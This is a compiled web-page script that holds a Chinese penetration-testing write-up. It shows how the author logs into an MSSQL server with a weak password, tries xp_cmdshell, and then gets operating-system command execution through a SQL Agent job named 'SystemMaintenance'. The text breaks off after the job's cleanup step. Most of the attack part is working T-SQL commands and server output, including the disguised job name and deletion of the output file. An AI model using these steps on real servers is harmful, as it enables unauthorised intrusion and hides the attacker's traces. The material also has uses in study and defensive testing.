import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as n,o as e}from"./app-Dzs2ck5r.js";const l={};function t(h,s){return e(),a("div",null,s[0]||(s[0]=[n(`<h2 id="开端" tabindex="-1"><a class="header-anchor" href="#开端"><span>开端</span></a></h2><figure><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20251018211716.png" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure><p><code>fscan</code>扫描，爆出<code>mssql</code>弱密码<code>san:1</code><br> 使用sqsh连接mssql</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sqsh</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10.99.xx.xx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -U</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sa</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -P</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="首次xp-cmdshellrce尝试" tabindex="-1"><a class="header-anchor" href="#首次xp-cmdshellrce尝试"><span>首次<code>xp_cmdshell</code>RCE尝试</span></a></h2><p>为了执行命令，首先查看最短最方便的路径<code>xp_cmdshell</code>命令执行<br> 启动<code>xp_cmdshell</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; EXEC sp_configure </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;show advanced options&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, 1; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; RECONFIGURE; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">3&gt; go </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Configuration</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;show advanced options&#39;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> changed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> from</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 1.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Run</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> RECONFIGURE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> statement</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (return </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查询<code>xp_cmdshell</code>是否启用</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt;EXEC sp_configure </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;xp_cmdshell&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">go</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">name</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        ----------------------------------------------------------------------------------------------------------------</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        xp_cmdshell</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        minimum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">     maximum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">     config_value</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> run_value</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">        -----------</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -----------</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> ------------</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -----------</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">                  0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">           1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">            1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">           1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>显示已经启用<br> 但是在命令执行时却出现问题</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; EXEC xp_cmdshell </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;whoami&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; go </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Msg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 15121,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Level</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 16,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> State</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 21</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;ZHANGWEI&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Procedure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;xp_cmdshell&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Line</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">An</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> error</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> occurred</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> during</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> execution</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> xp_cmdshell.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> call</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;CreateProcess&#39;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> failed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> with</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> error</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> code:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;5&#39;.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (return </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 15121</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>错误代码5，这表示“访问被拒绝”。这通常是由于SQL Server服务账户没有足够的权限来执行命令。<br> 尝试使用方案二进行命令执行</p><h2 id="sql-agent-作业rce" tabindex="-1"><a class="header-anchor" href="#sql-agent-作业rce"><span>SQL Agent 作业RCE</span></a></h2><p>首先查询<code>SQL Agent</code>是否启动</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; DECLARE @agent_status INT; </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">EXEC</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> master.dbo.xp_regread</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;HKEY_LOCAL_MACHINE&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;SYSTEM\\CurrentControlSet\\Services\\SQLSERVERAGENT&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;Start&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">,</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">@agent_status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> OUTPUT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">SELECT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	CASE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> @agent_status</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">		WHEN</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> THEN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Auto Start&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">		WHEN</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> THEN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Manual Start&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">		WHEN</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> THEN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Disabled&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">		ELSE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Unknown&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	END</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> AS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> AgentStatus</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; go </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">AgentStatus</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">------------------------------------------------</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Auto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Start</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (1 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">row</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> affected</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查询到<code>agent</code>状态为自启动，意味指<code>agent</code>现在处于启动状态</p><h3 id="准备步骤" tabindex="-1"><a class="header-anchor" href="#准备步骤"><span>准备步骤</span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; USE msdb; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; go </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">1&gt; EXEC dbo.sp_add_job </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	@job_name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;,</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	@enabled</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 1,</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	@description</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;System maintenance tasks&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">2&gt; go </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>切换上下文到msdb系统数据库<br> 执行系统存储过程 <code>sp_add_job</code>，并设置相应参数以及描述<br><em><strong>总结</strong></em>：<br> 这段代码在 <code>msdb</code>数据库中创建了一个名为 ​<strong>​<code>SystemMaintenance</code>​</strong>​ 的 SQL Server 代理作业，该作业处于启用状态，并添加了描述信息。后续需要进一步配置作业步骤（如备份数据库、重建索引等）和调度计划，才能使作业实际运行。</p><h3 id="复杂-添加作业步骤" tabindex="-1"><a class="header-anchor" href="#复杂-添加作业步骤"><span>（复杂）添加作业步骤</span></a></h3><p>步骤一<code>RunWhoami</code>：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_add_jobstep</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @job_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @step_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;RunWhoami&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @subsystem</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;CMDEXEC&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @command</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;whoami &gt; C:\\Windows\\Temp\\output.txt&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @retry_attempts</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @retry_interval</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<strong>​参数​</strong>​：</p><ul><li><code>@subsystem = &#39;CMDEXEC&#39;</code>：执行操作系统命令</li><li><code>@command = &#39;whoami&#39;</code>：显示当前用户身份</li><li><code>@retry_attempts = 1</code>：失败时重试1次</li><li><code>@retry_interval = 5</code>：重试间隔5分钟</li></ul><p>（TSQL步骤）步骤二<code>CaptureOutput</code>：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_add_jobstep</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @job_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @step_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;CaptureOutput&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @subsystem</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;TSQL&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @command</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DECLARE @output VARCHAR(MAX);</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">               SET @output = (SELECT BulkColumn FROM OPENROWSET(BULK N&#39;&#39;C:\\Windows\\Temp\\output.txt&#39;&#39;, SINGLE_CLOB) AS Contents);</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">               EXEC msdb.dbo.sp_update_job @job_name = &#39;&#39;SystemMaintenance&#39;&#39;, @description = @output;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @database_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;msdb&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @on_success_action</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>作用​</strong>​： <ol><li>读取第一步生成的 <code>C:\\Windows\\Temp\\output.txt</code>文件</li><li>将文件内容更新到作业描述中</li></ol></li><li>​<strong>​关键参数​</strong>​： <ul><li><code>@on_success_action = 3</code>：成功后转到下一步骤</li></ul></li></ul><p>步骤三<code>Cleanup</code>：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_add_jobstep</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @job_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @step_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Cleanup&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @subsystem</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;CMDEXEC&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @command</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;del C:\\Windows\\Temp\\output.txt&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @on_success_action</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
